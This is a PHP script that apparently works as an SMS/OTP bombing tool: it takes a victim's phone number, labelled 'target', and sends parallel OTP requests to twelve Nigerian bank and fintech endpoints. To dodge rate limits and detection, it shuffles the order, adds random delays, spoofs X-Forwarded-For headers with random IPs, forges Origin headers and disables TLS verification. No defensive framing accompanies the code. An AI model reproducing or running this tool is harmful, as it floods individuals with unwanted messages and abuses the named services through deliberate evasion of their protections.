<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$number = $_GET['number'] ?? '';
$number = preg_replace('/[^0-9]/', '', $number);

if (strlen($number) < 10) {
    die(json_encode(['status' => 'error', 'message' => 'Invalid number']));
}

if (strlen($number) === 11 && $number[0] === '0') {
    $number = '234' . substr($number, 1);
}

$endpoints = [
    ['Opay', 'https://api.opayweb.com/api/v1/user/send-otp', 'phone'],
    ['Palmpay', 'https://api.palmpay.com/api/v1/auth/send-otp', 'phoneNumber'],
    ['Kuda', 'https://kuda.com/api/v1/auth/send-otp', 'phoneNumber'],
    ['Carbon', 'https://api.getcarbon.co/api/v1/auth/send-otp', 'phone'],
    ['FairMoney', 'https://api.fairmoney.ng/api/v1/auth/send-otp', 'phoneNumber'],
    ['Flutterwave', 'https://api.flutterwave.com/v3/otps', 'phone'],
    ['Moniepoint', 'https://api.moniepoint.com/api/v1/auth/send-otp', 'phoneNumber'],
    ['Access Bank', 'https://www.accessbankplc.com/api/v1/auth/send-otp', 'phoneNumber'],
    ['GTBank', 'https://www.gtbank.com/api/v1/auth/send-otp', 'phoneNumber'],
    ['UBA', 'https://www.ubagroup.com/api/v1/auth/send-otp', 'phoneNumber'],
    ['FirstBank', 'https://www.firstbanknigeria.com/api/v1/auth/send-otp', 'phoneNumber'],
    ['Zenith', 'https://www.zenithbank.com/api/v1/auth/send-otp', 'phoneNumber'],
];

shuffle($endpoints);
usleep(rand(300000, 1500000));

$mh = curl_multi_init();
$curlHandles = [];

foreach ($endpoints as $i => $ep) {
    $name = $ep[0]; $url = $ep[1]; $field = $ep[2];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 8);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([$field => $number]));
    $fakeIp = rand(1,254).'.'.rand(1,254).'.'.rand(1,254).'.'.rand(1,254);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json', 'Accept: application/json',
        'X-Forwarded-For: '.$fakeIp,
        'Origin: '.parse_url($url, PHP_URL_SCHEME).'://'.parse_url($url, PHP_URL_HOST),
    ]);
    curl_multi_add_handle($mh, $ch);
    $curlHandles[$i] = ['handle' => $ch, 'name' => $name];
}
$running = 0;
do { curl_multi_exec($mh, $running); curl_multi_select($mh); } while ($running > 0);

$results = []; $success = 0; $failed = 0;
foreach ($curlHandles as $i => $info) {
    $httpCode = curl_getinfo($info['handle'], CURLINFO_HTTP_CODE);
    $error = curl_error($info['handle']);
    $status = ($httpCode > 0) ? 'sent' : 'failed';
    if ($status === 'sent') $success++; else $failed++;
    $results[] = ['name' => $info['name'], 'status' => $status, 'http_code' => $httpCode, 'error' => $error ?: null];
    curl_multi_remove_handle($mh, $info['handle']); curl_close($info['handle']);
}
curl_multi_close($mh);

echo json_encode(['status' => 'complete', 'target' => $number, 'total' => count($endpoints), 'success' => $success, 'failed' => $failed, 'details' => $results], JSON_PRETTY_PRINT);
